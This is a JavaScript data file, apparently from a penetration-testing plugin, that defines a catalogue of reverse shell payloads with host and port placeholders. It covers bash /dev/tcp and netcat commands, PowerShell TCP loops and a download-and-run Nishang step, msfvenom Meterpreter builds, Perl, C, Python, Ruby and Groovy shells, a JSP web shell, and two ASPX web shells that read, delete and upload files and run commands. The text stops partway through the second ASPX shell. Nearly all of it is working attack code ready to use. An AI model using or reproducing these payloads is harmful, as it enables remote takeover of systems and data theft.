const reverseShells = {
    "reverse_shell": {
        "bash": [
            {
                "title": "/dev/tcp redirect (Linux)",
                "platform": "Linux/Unix",
                "command": `bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1`,
                "highlight": bash,
                "shorttag": "Bash TCP Linux"
            },
            {
                "title": "mkfifo + nc pipe (Linux)",
                "platform": "Linux/Unix",
                "command": `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | bash -i 2>&1 | nc {{LHOST}} {{LPORT}} >/tmp/f`,
                "highlight": bash,
                "shorttag": "Bash mkfifo Linux"
            },
            {
                "title": "fd 196 (Bash 4.0+, Linux)",
                "platform": "Linux/Unix, Bash 4.0+",
                "command": `0<&196;exec 196<>/dev/tcp/{{LHOST}}/{{LPORT}};bash <&196 >&196 2>&196`,
                "highlight": bash,
                "shorttag": "Bash TCP 4.0+ Linux"
            },
            {
                "title": "fd 5 read loop (Linux)",
                "platform": "Linux/Unix",
                "command": `exec 5<>/dev/tcp/{{LHOST}}/{{LPORT}};cat <&5 | while read line; do $line 2>&5 >&5; done`,
                "highlight": bash,
                "shorttag": "Bash TCP 2 Linux"
            },
            {
                "title": "fd 5 interactive (Linux)",
                "platform": "Linux/Unix",
                "command": `bash -i 5<> /dev/tcp/{{LHOST}}/{{LPORT}} 0<&5 1>&5 2>&5`,
                "highlight": bash,
                "shorttag": "Bash TCP 3 Linux"
            },
            {
                "title": "/dev/udp redirect (Linux)",
                "platform": "Linux/Unix",
                "command": `bash -i >& /dev/udp/{{LHOST}}/{{LPORT}} 0>&1`,
                "highlight": bash,
                "shorttag": "Bash UDP Linux"
            },
        ],
        "powershell": [
            {
                "title": "Nishang Invoke-PowerShellTcp (Windows)",
                "platform": "Windows",
                "command": `##### NISHANG reverse shells (generic shell listener)
# 1. clone https://github.com/samratashok/nishang (attacker machine)
git clone https://github.com/samratashok/nishang

# 2. Navigate to directory & serve shell files (attacker machine)
cd nishang/Shells
python3 -m http.server 80

# 3. Execute (target machine)
IEX(New-Object Net.WebClient).DownloadString('http://{{LHOST}}:80/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress {{LHOST}} -Port {{LPORT}}`,
                "highlight": powershell,
                "shorttag": "Nishang reverse shell"
            },
            {
                "title": "TCPClient StreamReader loop (Windows, PowerShell 2.0+)",
                "platform": "Windows, PowerShell 2.0+",
                "command": `$LHOST = "{{LHOST}}"; 
$LPORT = {{LPORT}}; 
$TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT);
$NetworkStream = $TCPClient.GetStream(); 
$StreamReader = New-Object IO.StreamReader($NetworkStream);
$StreamWriter = New-Object IO.StreamWriter($NetworkStream); 
$StreamWriter.AutoFlush = $true;
$Buffer = New-Object System.Byte[] 1024; 
while ($TCPClient.Connected) { 
    while ($NetworkStream.DataAvailable) {
        $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); 
        $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) 
    };
    if ($TCPClient.Connected -and $Code.Length -gt 1) { 
        $Output = try { Invoke-Expression ($Code) 2>&1 } 
        catch { $_ };
        $StreamWriter.Write("$Output\`n"); 
        $Code = $null 
    } 
};
$TCPClient.Close(); 
$NetworkStream.Close();
$StreamReader.Close(); 
$StreamWriter.Close()`,
                "highlight": powershell,
                "shorttag": "PowerShell 2.0+ TCP"
            },
            {
                "title": "TCPClient iex loop (Windows, PowerShell 2.0+)",
                "platform": "Windows, PowerShell 2.0+",
                "command": `try {
    $client = New-Object System.Net.Sockets.TCPClient('{{LHOST}}',{{LPORT}});
    $stream = $client.GetStream();
    [byte[]]$bytes = 0..65535|%{0};
    
    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
        try {
            $sendback = (iex $data 2>&1 | Out-String);
        } catch {
            $sendback = "Error executing command: $_";
        }
        $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); 
        $stream.Write($sendbyte, 0, $sendbyte.Length);
        $stream.Flush();
    }
    
    $client.Close();
} catch {
    Write-Error "An error occurred: $_"
}
`,
                "highlight": powershell,
                "shorttag": "PowerShell 2.0+ nop"
            },
            {
                "title": "Base64-encoded one-liner (Windows)",
                "platform": "Windows",
                "command": `# 1. create the 1 liner reverse shell (use pwsh)
$client = New-Object System.Net.Sockets.TCPClient("{{LHOST}}",{{LPORT}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

# 2. encode it with the base64 - UTF-16LE character set (within this plugin)
...

# 3. run the payload on the target machine
powershell -enc $EncodedText
`,
                "highlight": powershell,
                "shorttag": "powershell 1 liner encoded"
            },
        ],
        "msfvenom": [
            {
                "title": "Meterpreter ELF (Linux x86/x64)",
                "platform": "Linux/Unix",
                "command": `# 1. Generate the payload for x64 architecture
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f elf > meterpreterx64.elf

# 2. Generate the payload for x86 architecture
msfvenom -p linux/meterpreter_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f elf > meterpreterx86.elf
`,
                "highlight": bash,
                "shorttag": "msfvenom meterpreter | .elf - 32 bit/ 64 bit"
            },
            {
                "title": "Meterpreter EXE (Windows x86/x64)",
                "platform": "Windows",
                "command": `# 1. Generate the payload for x64 architecture
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f exe > meterpreterx64.exe

# 2. Generate the payload for x86 architecture
msfvenom -p windows/meterpreter_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f exe > meterpreterx86.exe`,
                "highlight": bash,
                "shorttag": "msfvenom meterpreter | .exe - 32 bit/ 64 bit"
            },
            {
                "title": "Shell ELF (Linux x86/x64)",
                "platform": "Linux/Unix",
                "command": `# 1. Generate the payload for x64 architecture
msfvenom -p linux/x64/shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f elf > shellx64.elf
                
# 2. Generate the payload for x86 architecture
msfvenom -p linux/shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f elf > shellx86.elf`,
                "highlight": bash,
                "shorttag": "msfvenom shell_reverse_tcp | .elf - 32 bit/ 64 bit"
            },
            {
                "title": "Shell EXE + DLL (Windows x86/x64)",
                "platform": "Windows",
                "command": `# 1. Generate the payload for x64 architecture
msfvenom -p windows/x64/shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f exe > shellx64.exe
                
# 2. Generate the payload for x86 architecture
msfvenom -p windows/shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f exe > shellx86.exe

# 3. Generate a .dll file for Windows (x64)
msfvenom -p windows/x64/shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f dll -o file.dll`,
                "highlight": bash,
                "shorttag": "msfvenom shell + dll - 32 bit/ 64 bit"
            },
        ],
        "netcat": [
            {
                "title": "nc -e /bin/bash (Linux)",
                "platform": "Linux/Unix",
                "command": `nc {{LHOST}} {{LPORT}} -e /bin/bash`,
                "highlight": bash,
                "shorttag": "Netcat TCP Linux"
            },
            {
                "title": "nc.exe -e (Windows)",
                "platform": "Windows",
                "command": `nc.exe {{LHOST}} {{LPORT}} -e /bin/bash`,
                "highlight": bash,
                "shorttag": "Netcat TCP Windows"
            },
            {
                "title": "nc -c /bin/bash (Linux)",
                "platform": "Linux/Unix",
                "command": `nc -c /bin/bash {{LHOST}} {{LPORT}}`,
                "highlight": bash,
                "shorttag": "Netcat -c Linux"
            }
        ],
        "ncat": [
            {
                "title": "ncat -e /bin/bash (Linux)",
                "platform": "Linux/Unix",
                "command": `ncat {{LHOST}} {{LPORT}} -e /bin/bash`,
                "highlight": bash,
                "shorttag": "Ncat TCP Linux"
            },
            {
                "title": "ncat.exe -e (Windows)",
                "platform": "Windows",
                "command": `ncat.exe {{LHOST}} {{LPORT}} -e /bin/bash`,
                "highlight": bash,
                "shorttag": "Ncat TCP Windows"
            },
        ],
        "perl": [
            {
                "title": "Perl Socket + exec (Linux)",
                "platform": "Linux/Unix",
                "command": `perl -e 'use Socket;
$i="{{LHOST}}";$p={{LPORT}};
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){
    open(STDIN,">&S");
    open(STDOUT,">&S");
    open(STDERR,">&S");
    exec("bash -i");
};'`,
                "highlight": "language-perl",
                "shorttag": "Perl TCP Linux"
            },
            {
                "title": "Perl IO::Socket fork (Linux)",
                "platform": "Linux/Unix",
                "command": `perl -MIO -e '$p=fork;exit,if($p);
$c=new IO::Socket::INET(PeerAddr,"{{LHOST}}:{{LPORT}}");
STDIN->fdopen($c,r);
$~->fdopen($c,w);
system$_ while<>'`,
                "highlight": "language-perl",
                "shorttag": "Perl IO Linux"
            }
        ],
        "c": [
            {
                "title": "C reverse shell (Windows, x86_64)",
                "platform": "Windows",
                "command": `// 1. compile as follows: 
// x86_64-w64-mingw32-gcc-win32 main.c -shared -lws2_32 -o RevShell.dll

// 2. once compiled, check the exports (functions) of the DLL that can be called by rundll32.exe:
// python3 -m pefile exports RevShell.dll

// 3. execute the DLL using rundll32.exe (optional):
// rundll32.exe RevShell.dll,ExecuteShell

#include <winsock2.h>
#include <windows.h>
#include <io.h>
#include <process.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int ReverShell(const char* CLIENT_IP, int CLIENT_PORT) {

\tWSADATA wsaData;
\tif (WSAStartup(MAKEWORD(2 ,2), &wsaData) != 0) {
\t\twrite(2, "[ERROR] WSASturtup failed.\\n", 27);
\t\treturn (1);
\t}

\tint port = CLIENT_PORT;
\tstruct sockaddr_in sa;
\tSOCKET sockt = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
\tsa.sin_family = AF_INET;
\tsa.sin_port = htons(port);
\tsa.sin_addr.s_addr = inet_addr(CLIENT_IP);

#ifdef WAIT_FOR_CLIENT
\twhile (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
\t\tSleep(5000);
\t}
#else
\tif (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
\t\twrite(2, "[ERROR] connect failed.\\n", 24);
\t\treturn (1);
\t}
#endif

\tSTARTUPINFO sinfo;
\tmemset(&sinfo, 0, sizeof(sinfo));
\tsinfo.cb = sizeof(sinfo);
\tsinfo.dwFlags = (STARTF_USESTDHANDLES);
\tsinfo.hStdInput = (HANDLE)sockt;
\tsinfo.hStdOutput = (HANDLE)sockt;
\tsinfo.hStdError = (HANDLE)sockt;
\tPROCESS_INFORMATION pinfo;
\tCreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);

\treturn (0);
}

void ExecuteShell(){
    ReverShell("{{LHOST}}", {{LPORT}});
}`,
                "highlight": "language-c",
                "shorttag": "C TCP Windows"
            }

        ],
        "python3": [
            {
                "title": "Threaded subprocess (cross-platform, python3)",
                "platform": "Windows/Linux/Unix, Python 3.0+",
                "command": `import os,socket,subprocess,threading;
def s2p(s, p): 
    while True: 
        data = s.recv(1024) 
        if len(data) > 0: 
            p.stdin.write(data) 
            p.stdin.flush()
def p2s(s, p): 
    while True: 
        s.send(p.stdout.read(1))
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{{LHOST}}",{{LPORT}}))
p=subprocess.Popen(["bash"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
s2p_thread = threading.Thread(target=s2p, args=[s, p])
s2p_thread.daemon = True 
s2p_thread.start()
p2s_thread = threading.Thread(target=p2s, args=[s, p])
p2s_thread.daemon = True 
p2s_thread.start()
try: 
    p.wait() 
except KeyboardInterrupt: 
    s.close()`,
                "highlight": "language-python",
                "shorttag": "Python3 threading"
            },
            {
                "title": "pty.spawn .py file (Linux, python3)",
                "platform": "Linux/Unix, Python 3.0+",
                "command": `import os,pty,socket;
s=socket.socket();
s.connect(("{{LHOST}}",{{LPORT}}));
[os.dup2(s.fileno(),f)for f in(0,1,2)];
pty.spawn("bash")`,
                "highlight": "language-python",
                "shorttag": "Python3 pty"
            },
            {
                "title": "pty.spawn via env vars (Linux, python3)",
                "platform": "Linux/Unix, Python 3.0+",
                "command": `export RHOST="{{LHOST}}";
export RPORT={{LPORT}};
python3 -c 'import sys,socket,os,pty;
s=socket.socket();
s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));
[os.dup2(s.fileno(),fd) for fd in (0,1,2)];
pty.spawn("bash")'`,
                "highlight": "language-python",
                "shorttag": "Python3 TCP Linux"
            },
            {
                "title": "pty.spawn via dup2 (Linux, python3)",
                "platform": "Linux/Unix, Python 3.0+",
                "command": `python3 -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("{{LHOST}}",{{LPORT}}));
os.dup2(s.fileno(),0); 
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
import pty; 
pty.spawn("bash")'`,
                "highlight": "language-python",
                "shorttag": "Python3 TCP Unix"
            },
            {
                "title": "pty.spawn one-liner (Linux, python3)",
                "platform": "Linux/Unix, Python 3.0+",
                "command": `python3 -c 'import os,pty,socket;
s=socket.socket();
s.connect(("{{LHOST}}",{{LPORT}}));
[os.dup2(s.fileno(),f)for f in(0,1,2)];
pty.spawn("bash")'`,
                "highlight": "language-python",
                "shorttag": "Python3 pty"
            },
        ],
        "ruby": [
            {
                "title": "TCPSocket interactive loop (cross-platform, ruby)",
                "platform": "Linux/Unix && Windows",
                "command": `#!/usr/bin/env ruby
require 'socket'

H = ARGV[0] || '{{LHOST}}'
P = (ARGV[1] || {{LPORT}}).to_i
W = RUBY_PLATFORM =~ /win|mingw/i
U = (W ? ENV['USERNAME'] : ENV['USER']) || \`whoami\`.strip rescue '?'
N = \`hostname\`.strip rescue '?'

loop do
  begin
    s = TCPSocket.new(H, P)
    s.sync = true
    s.puts "#{W ? \`ver\` : \`uname -a\`}"

    loop do
      s.print "#{U}@#{N}:#{Dir.pwd}$ "
      c = s.gets&.strip
      break if c.nil? || c == 'exit'
      next if c.empty?

      if c =~ /^cd\\s*(.*)/
        Dir.chdir($1.empty? ? (ENV['HOME'] || '/') : $1) rescue s.puts("Invalid directory")
      else
        s.puts \`#{c} 2>&1\`
      end
    end
  rescue
    sleep 3
  end
end
`,
                "highlight": "language-bash",
                "shorttag": "ruby TCP Windows & Linux"
            }
        ],
        "groovy": [
            {
                "title": "Groovy reverse shell (Windows)",
                "platform": "Windows / groovy",
                "command": `String host="{{LHOST}}";
int port={{LPORT}};
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();`,
                "highlight": "language-bash",
                "shorttag": "Groovy TCP Windows"
            },
            {
                "title": "Groovy reverse shell (Linux)",
                "platform": "Linux / groovy",
                "command": `String host="{{LHOST}}";
int port={{LPORT}};
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();`,
                "highlight": "language-bash",
                "shorttag": "Groovy TCP Linux"
            }
        ],
        "jsp": [
            {
                "title": "jsp web shell",
                "platform": "JSP web shell",
                "command": `<%@page import="java.io.*"%>
<%
String cmd = request.getParameter("cmd");
if(cmd != null) {
    String os = System.getProperty("os.name").toLowerCase();
    String[] command;
    if(os.contains("win"))
        command = new String[]{"cmd.exe", "/c", cmd};
    else
        command = new String[]{"/bin/sh", "-c", cmd};
    Process proc = Runtime.getRuntime().exec(command);
    BufferedReader stdOut = new BufferedReader(new InputStreamReader(proc.getInputStream()));
    BufferedReader stdErr = new BufferedReader(new InputStreamReader(proc.getErrorStream()));
    StringBuilder sb = new StringBuilder();
    String line;
    while((line = stdOut.readLine()) != null)
        sb.append(line).append("\\n");
    while((line = stdErr.readLine()) != null)
        sb.append(line).append("\\n");
    int exitCode = proc.waitFor();
    String output = sb.toString()
        .replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;");
    if(exitCode != 0)
        out.println("<pre style='color:red'>" + output + "</pre>");
    else
        out.println("<pre>" + output + "</pre>");
}
%>
<form method="get">
    <input type="text" name="cmd" size="50">
    <input type="submit" value="Execute">
</form>`,
                "highlight": "language-xml",
                "shorttag": "JSP web and reverse shell"
            },
        ],
        "aspx": [
            {
                "title": "ASPX web shell (Windows, authenticated)",
                "platform": "Windows/ ASPX",
                "command": `<%-- ASPX Shell by LT <lt@mac.hush.com> (2007) --%>
<%@ Page Language="C#" EnableViewState="false" %>
<%@ Import Namespace="System.Web.UI.WebControls" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
 
<%
 
\tstring secretKey = "YourMomHeetsHenk!@4"; // Your secret key here
\tstring auth = Request.QueryString["auth"];
 
\tif (auth != secretKey)
\t{
\t    Response.StatusCode = 403;
\t    Response.Write("<h2>403 Forbidden</h2>");
\t    Response.End();
\t}
 
\tstring outstr = "";
\t
\t// get pwd
\tstring dir = Page.MapPath(".") + "/";
\tif (Request.QueryString["fdir"] != null)
\t\tdir = Request.QueryString["fdir"] + "/";
\tdir = dir.Replace("\\\\", "/");
\tdir = dir.Replace("//", "/");
\t
\t// build nav for path literal
\tstring[] dirparts = dir.Split('/');
\tstring linkwalk = "";\t
\tforeach (string curpart in dirparts)
\t{
\t\tif (curpart.Length == 0)
\t\t\tcontinue;
\t\tlinkwalk += curpart + "/";
\t\toutstr += string.Format("<a href='?fdir={0}&auth={1}'>{2}/</a>&nbsp;",
\t\t\t\t\t\t\t\t\tHttpUtility.UrlEncode(linkwalk),
                                    secretKey,
\t\t\t\t\t\t\t\t\tHttpUtility.HtmlEncode(curpart));
\t}
\tlblPath.Text = outstr;
\t
\t// create drive list
\toutstr = "";
\tforeach(DriveInfo curdrive in DriveInfo.GetDrives())
\t{
\t\tif (!curdrive.IsReady)
\t\t\tcontinue;
\t\tstring driveRoot = curdrive.RootDirectory.Name.Replace("\\\\", "");
\t\toutstr += string.Format("<a href='?fdir={0}&auth={1}'>{2}</a>&nbsp;",
\t\t\t\t\t\t\t\t\tHttpUtility.UrlEncode(driveRoot),
                                    secretKey,
\t\t\t\t\t\t\t\t\tHttpUtility.HtmlEncode(driveRoot));
\t}
\tlblDrives.Text = outstr;
 
\t// send file ?
\tif ((Request.QueryString["get"] != null) && (Request.QueryString["get"].Length > 0))
\t{
\t\tResponse.ClearContent();
\t\tResponse.WriteFile(Request.QueryString["get"]);
\t\tResponse.End();
\t}
 
\t// delete file ?
\tif ((Request.QueryString["del"] != null) && (Request.QueryString["del"].Length > 0))
\t\tFile.Delete(Request.QueryString["del"]);\t
 
\t// receive files ?
\tif(flUp.HasFile)
\t{
\t\tstring fileName = flUp.FileName;
\t\tint splitAt = flUp.FileName.LastIndexOfAny(new char[] { '/', '\\\\' });
\t\tif (splitAt >= 0)
\t\t\tfileName = flUp.FileName.Substring(splitAt);
\t\tflUp.SaveAs(dir + "/" + fileName);
\t}
 
\t// enum directory and generate listing in the right pane
\tDirectoryInfo di = new DirectoryInfo(dir);
\toutstr = "";
\tforeach (DirectoryInfo curdir in di.GetDirectories())
\t{
\t\tstring fstr = string.Format("<a href='?fdir={0}&auth={1}'>{2}</a>",
\t\t\t\t\t\t\t\t\tHttpUtility.UrlEncode(dir + "/" + curdir.Name),
                                    secretKey,
\t\t\t\t\t\t\t\t\tHttpUtility.HtmlEncode(curdir.Name));
\t\toutstr += string.Format("<tr><td>{0}</td><td>&lt;DIR&gt;</td><td></td></tr>", fstr);
\t}
\tforeach (FileInfo curfile in di.GetFiles())
\t{
\t\tstring fstr = string.Format("<a href='?get={0}&auth={1}' target='_blank'>{2}</a>",
\t\t\t\t\t\t\t\t\tHttpUtility.UrlEncode(dir + "/" + curfile.Name),
                                    secretKey,
\t\t\t\t\t\t\t\t\tHttpUtility.HtmlEncode(curfile.Name));
\t\tstring astr = string.Format("<a href='?fdir={0}&auth={1}&del={2}'>Del</a>",
\t\t\t\t\t\t\t\t\tHttpUtility.UrlEncode(dir),
                                    secretKey,
\t\t\t\t\t\t\t\t\tHttpUtility.UrlEncode(dir + "/" + curfile.Name));
\t\toutstr += string.Format("<tr><td>{0}</td><td>{1:d}</td><td>{2}</td></tr>", fstr, curfile.Length / 1024, astr);
\t}
\tlblDirOut.Text = outstr;
 
\t// exec cmd ?
\tif (txtCmdIn.Text.Length > 0)
\t{
\t\tProcess p = new Process();
\t\tp.StartInfo.CreateNoWindow = true;
\t\tp.StartInfo.FileName = "cmd.exe";
\t\tp.StartInfo.Arguments = "/c " + txtCmdIn.Text;
\t\tp.StartInfo.UseShellExecute = false;
\t\tp.StartInfo.RedirectStandardOutput = true;
\t\tp.StartInfo.RedirectStandardError = true;
\t\tp.StartInfo.WorkingDirectory = dir;
\t\tp.Start();
 
\t\tlblCmdOut.Text = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
\t\ttxtCmdIn.Text = "";
\t}\t
%>
 
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
 
<html xmlns="http://www.w3.org/1999/xhtml" >
<head>
\t<title>ASPX Shell</title>
\t<style type="text/css">
\t\t* { font-family: Arial; font-size: 12px; }
\t\tbody { margin: 0px; }
\t\tpre { font-family: Courier New; background-color: #CCCCCC; }
\t\th1 { font-size: 16px; background-color: #00AA00; color: #FFFFFF; padding: 5px; }
\t\th2 { font-size: 14px; background-color: #006600; color: #FFFFFF; padding: 2px; }
\t\tth { text-align: left; background-color: #99CC99; }
\t\ttd { background-color: #CCFFCC; }
\t\tpre { margin: 2px; }
\t</style>
</head>
<body>
\t<h1>ASPX Shell by LT</h1>
    <form id="form1" runat="server">
    <table style="width: 100%; border-width: 0px; padding: 5px;">
\t\t<tr>
\t\t\t<td style="width: 50%; vertical-align: top;">
\t\t\t\t<h2>Shell</h2>\t\t\t\t
\t\t\t\t<asp:TextBox runat="server" ID="txtCmdIn" Width="300" />
\t\t\t\t<asp:Button runat="server" ID="cmdExec" Text="Execute" />
\t\t\t\t<pre><asp:Literal runat="server" ID="lblCmdOut" Mode="Encode" /></pre>
\t\t\t</td>
\t\t\t<td style="width: 50%; vertical-align: top;">
\t\t\t\t<h2>File Browser</h2>
\t\t\t\t<p>
\t\t\t\t\tDrives:<br />
\t\t\t\t\t<asp:Literal runat="server" ID="lblDrives" Mode="PassThrough" />
\t\t\t\t</p>
\t\t\t\t<p>
\t\t\t\t\tWorking directory:<br />
\t\t\t\t\t<b><asp:Literal runat="server" ID="lblPath" Mode="passThrough" /></b>
\t\t\t\t</p>
\t\t\t\t<table style="width: 100%">
\t\t\t\t\t<tr>
\t\t\t\t\t\t<th>Name</th>
\t\t\t\t\t\t<th>Size KB</th>
\t\t\t\t\t\t<th style="width: 50px">Actions</th>
\t\t\t\t\t</tr>
\t\t\t\t\t<asp:Literal runat="server" ID="lblDirOut" Mode="PassThrough" />
\t\t\t\t</table>
\t\t\t\t<p>Upload to this directory:<br />
\t\t\t\t<asp:FileUpload runat="server" ID="flUp" />
\t\t\t\t<asp:Button runat="server" ID="cmdUpload" Text="Upload" />
\t\t\t\t</p>
\t\t\t</td>
\t\t</tr>
    </table>
 
    </form>
</body>
</html>
`,
                "highlight": "language-xml",
                "shorttag": "ASPX web shell - authenticated"
            },
            {
                "title": "ASPX web shell (Windows)",
                "platform": "Windows/ ASPX",
                "command": `<%-- ASPX Shell by LT <lt@mac.hush.com> (2007) --%>
<%@ Page Language="C#" EnableViewState="false" %>
<%@ Import Namespace="System.Web.UI.WebControls" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>

<%
\tstring outstr = "";
\t
\t// get pwd
\tstring dir = Page.MapPath(".") + "/";
\tif (Request.QueryString["fdir"] != null)
\t\tdir = Request.QueryString["fdir"] + "/";
\tdir = dir.Replace("\\\\", "/");
\tdir = dir.Replace("//", "/");
\t
\t// build nav for path literal
\tstring[] dirparts = dir.Split('/');
\tstring linkwalk = "";\t
\tforeach (string curpart in dirparts)
\t{
\t\tif (curpart.Length == 0)
\t\t\tcontinue;
\t\tlinkwalk += curpart + "/";
\t\toutstr += string.Format("<a href='?fdir={0}'>{1}/</a>&nbsp;",
\t\t\t\t\t\t\t\t\tHttpUtility.UrlEncode(linkwalk),
\t\t\t\t\t\t\t\t\tHttpUtility.HtmlEncode(curpart));
\t}
\tlblPath.Text = outstr;
\t
\t// create drive list
\toutstr = "";
\tforeach(DriveInfo curdrive in DriveInfo.GetDrives())
\t{
\t\tif (!curdrive.IsReady)
\t\t\tcontinue;
\t\tstring driveRoot = curdrive.RootDirectory.Name.Replace("\\\\", "");
\t\toutstr += string.Format("<a href='?fdir={0}'>{1}</a>&nbsp;",
\t\t\t\t\t\t\t\t\tHttpUtility.UrlEncode(driveRoot),
\t\t\t\t\t\t\t\t\tHttpUtility.HtmlEncode(driveRoot));
\t}
\tlblDrives.Text = outstr;

\t// send file ?
\tif ((Request.QueryString["get"] != null) && (Request.QueryString["get"].Length > 0))
\t{
\t\tResponse.ClearContent();
\t\tResponse.WriteFile(Request.QueryString["get"]);
\t\tResponse.End();
\t}

\t// delete file ?
\tif ((Request.QueryString["del"] != null) && (Request.QueryString["del"].Length > 0))
\t\tFile.Delete(Request.QueryString["del"]);\t

\t// receive files ?
\tif(flUp.HasFile)
\t{
\t\tstring fileName = flUp.FileName;
\t\tint splitAt = flUp.FileName.LastIndexOfAny(new char[] { '/', '\\\\' });
\t\tif (splitAt >= 0)
\t\t\tfileName = flUp.FileName.Substring(splitAt);
\t\tflUp.SaveAs(dir + "/" + fileName);
\t}

\t// enum directory and generate listing in the right pane
\tDirectoryInfo di = new DirectoryInfo(dir);
\toutstr = "";
\tforeach (DirectoryInfo curdir in di.GetDirectories())
\t{
\t\tstring fstr = string.Format("<a href='?fdir={0}'>{1}</a>",
\t\t\t\t\t\t\t\t\tHttpUtility.UrlEncode(dir + "/" + curdir.Name),
\t\t\t\t\t\t\t\t\tHttpUtility.HtmlEncode(curdir.Name));
\t\toutstr += string.Format("<tr><td>{0}</td><td>&lt;DIR&gt;</td><td></td></tr>", fstr);
\t}
\tforeach (FileInfo curfile in di.GetFiles())
\t{
\t\tstring fstr = string.Format("<a href='?get={0}' target='_blank'>{1}</a>",
\t\t\t\t\t\t\t\t\tHttpUtility.UrlEncode(dir + "/" + curfile.Name),
\t\t\t\t\t\t\t\t\tHttpUtility.HtmlEncode(curfile.Name));
\t\tstring astr = string.Format("<a href='?fdir={0}&del={1}'>Del</a>",
\t\t\t\t\t\t\t\t\tHttpUtility.UrlEncode(dir),
\t\t\t\t\t\t\t\t\tHttpUtility.UrlEncode(dir + "/" + curfile.Name));
\t\toutstr += string.Format("<tr><td>{0}</td><td>{1:d}</td><td>{2}</td></tr>", fstr, curfile.Length / 1024, astr);
\t}
\tlblDirOut.Text = outstr;

\t// exec cmd ?
\tif (txtCmdIn.Text.Length > 0)
\t{
\t\tProcess p = new Process();
\t\tp.StartInfo.CreateNoWindow = true;
\t\tp.StartInfo.FileName = "cmd.exe";
\t\tp.StartInfo.Arguments = "/c " + txtCmdIn.Text;
\t\tp.StartInfo.UseShellExecute = false;
\t\tp.StartInfo.RedirectStandardOutput = true;
\t\tp.StartInfo.RedirectStandardError = true;
\t\tp.StartInfo.WorkingDirectory = dir;
\t\tp.Start();

\t\tlblCmdOut.Text = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
\t\ttxtCmdIn.Text = "";
\t}\t
%>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" >
<head>
\t<title>ASPX Shell</title>
\t<style type="text/css">
\t\t* { font-family: Arial; font-size: 12px; }
\t\tbody { margin: 0px; }
\t\tpre { font-family: Courier New; background-color: #CCCCCC; }
\t\th1 { font-size: 16px; background-color: #00AA00; color: #FFFFFF; padding: 5px; }
\t\th2 { font-size: 14px; background-color: #006600; color: #FFFFFF; padding: 2px; }
\t\tth { text-align: left; background-color: #99CC99; }
\t\ttd { background-color: #CCFFCC; }
\t\tpre { margin: 2px; }
\t</style>
</head>
<body>
\t<h1>ASPX Shell by LT</h1>
    <form id="form1" runat="server">
